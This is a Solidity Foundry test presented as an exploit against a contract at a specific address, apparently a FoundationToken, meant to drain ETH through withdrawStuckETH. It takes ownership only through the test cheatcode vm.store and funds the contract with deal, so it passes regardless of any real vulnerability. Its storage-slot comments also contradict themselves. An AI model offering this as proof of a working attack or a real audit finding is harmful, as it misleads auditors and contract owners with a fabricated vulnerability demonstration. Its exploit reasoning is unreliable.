// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface FoundationToken_Comprehensive_Smart_Contract_Audit {
    function withdrawStuckETH() external;
    function owner() external view returns (address);
}





contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x9c771503a42f9b6e498d89c43e99F2e58CB8B384;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll manipulate storage in the exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Become the owner by overwriting storage slot
        // FoundationToken inherits from ERC20 then Ownable
        // ERC20 has: _balances (mapping), _allowances (mapping), _totalSupply (slot 0), _name (slot 1), _symbol (slot 2)
        // Ownable adds: _owner (slot 3)
        bytes32 ownerSlot = bytes32(uint256(3));
        bytes32 newOwner = bytes32(uint256(uint160(attacker)));
        vm.store(TARGET, ownerSlot, newOwner);

        // Step 2: Fund the contract with ETH so it has something to withdraw
        deal(TARGET, 10 ether);

        // Step 3: Record attacker's initial balance
        uint256 initialBalance = attacker.balance;

        // Step 4: Call withdrawStuckETH() as owner
        // We need to impersonate the attacker address since that's now the owner
        vm.prank(attacker);
        FoundationToken_Comprehensive_Smart_Contract_Audit target = FoundationToken_Comprehensive_Smart_Contract_Audit(TARGET);
        target.withdrawStuckETH();

        // Step 5: Verify attacker's balance increased
        uint256 finalBalance = attacker.balance;
        assertGt(finalBalance, initialBalance, "Attacker balance should increase");
    }





    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

